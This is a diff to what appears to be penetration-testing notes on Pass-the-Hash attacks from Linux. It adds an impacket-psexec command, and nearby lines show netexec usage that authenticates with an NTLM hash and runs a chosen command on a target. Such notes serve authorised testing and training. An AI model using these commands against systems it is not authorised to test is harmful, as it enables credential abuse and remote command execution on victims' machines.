@@ -55,6 +55,12 @@ Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN_NAME> -Username <USERNAME> -H
 ## Pass the Hash (PtH) Attacks from Linux
 
 
+### Pass the Hash (PtH) using `impacket psexec`
+
+```bash
+impacket-psexec <USERNAME>@<TARGET_IP> -hashes :<HASH>
+```
+
 ### Pass the Hash (PtH) using `netexec`
 
 - Finding the password of the username.
@@ -63,7 +69,7 @@ Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN_NAME> -Username <USERNAME> -H
 netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH>
 ```
 
-#### Execute Command + Get Password
+#### Execute Command + Get Password using `netexec`
 
 ```bash
 netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH> -x <COMMAND_TO_EXECUTE>
